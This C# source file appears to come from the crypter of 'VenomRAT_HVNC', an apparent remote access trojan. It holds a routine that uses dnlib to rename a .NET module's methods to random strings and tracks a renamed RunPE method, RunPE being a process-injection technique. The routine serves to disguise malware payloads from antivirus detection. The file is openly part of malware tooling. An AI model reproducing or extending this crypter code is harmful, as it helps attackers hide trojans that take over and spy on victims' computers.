using System;
using dnlib.DotNet;
using VenomRAT_HVNC.Crypter.Settings;

namespace Client.Obfuscation.SimpleTechObfuscate;

public class Methods
{
    public static void obfuscate_methods(ModuleDef md)
    {
        foreach (var type in md.GetTypes())
        {
            // create method to obfuscation map
            foreach (MethodDef method in type.Methods)
            {
                // Vérification si la méthode a un nom spécial réservé par le runtime
                if (method.IsRuntimeSpecialName) continue;

                // Vérification si la méthode est une déclaration anticipée dans une bibliothèque externe
                if (method.DeclaringType.IsForwarder) continue;

                // Vérification si la méthode est vide
                if (!method.HasBody) continue;

                // Vérification si la méthode est un constructeur
                if (method.IsConstructor) continue;

                // Vérification si la méthode remplace une méthode dans une classe de base
                if (method.HasOverrides) continue;

                string encName = new GenerateKey(10).GenerateStrenghCharacter();
                if (method.Name == Settings.MethodRunPe) // Ne pas toucher la classe main RunPE
                {
                    Settings.MethodRunPe = encName;
                    method.Name = Settings.MethodRunPe;
                    continue;
                }

                method.Name = encName;
            }
        }
    }
}